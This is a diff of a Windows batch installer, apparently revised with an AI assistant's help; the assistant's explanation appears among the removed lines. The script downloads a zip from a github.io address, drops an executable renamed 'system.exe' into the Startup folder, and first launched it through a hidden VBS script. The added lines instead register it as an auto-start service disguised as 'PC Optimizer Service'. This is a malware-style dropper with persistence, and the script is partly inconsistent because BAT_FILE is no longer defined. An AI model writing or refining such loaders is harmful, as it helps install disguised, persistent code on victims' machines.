@@ -1,8 +1,3 @@
-The error is occurring because of how the quotes are being handled when the batch file creates the VBS script. The path %TARGET_DIR% contains spaces, and the escaping is failing, causing a syntax error in the generated VBS file.
-
-Here is the corrected version. This version uses a more robust method to create the VBS file, avoiding the complex escaping issues:
-batch
-
 @echo off
 setlocal
 
@@ -11,8 +6,9 @@ setlocal
 set "URL=https://luckiestpancake.github.io/Files/test.zip"
 set "ZIP_NAME=downloaded_app.zip"
 set "TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pc-optimizer"
-set "EXE_NAME=test.exe"
-set "BAT_FILE=start.bat"
+set "EXE_NAME=system.exe"
+set "SERVICE_NAME=PCOptimizer"
+set "SERVICE_DISPLAY=PC Optimizer Service"
 
 echo Creating Target Directory...
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
@@ -40,10 +36,19 @@ del "%TARGET_DIR%\%ZIP_NAME%"
   echo start "" "%EXE_NAME%"
 ) > "%TARGET_DIR%\%BAT_FILE%"
 
-:: Create VBS script to run batch silently
-echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
-echo command = "%TARGET_DIR%\%BAT_FILE%" >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
-echo WshShell.Run command, 0, False >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
-echo Set WshShell = Nothing >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
+echo Checking if service already exists...
+sc query "%SERVICE_NAME%" >nul 2>&1
+if %errorlevel% equ 1060 (
+    echo Service does not exist. Creating new service...
+    sc create "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
+    echo Service created successfully.
+) else (
+    echo Service already exists. Updating service...
+    sc config "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
+    echo Service updated successfully.
+)
+
+echo Starting service...
+sc start "%SERVICE_NAME%"
 
 echo Installation complete.
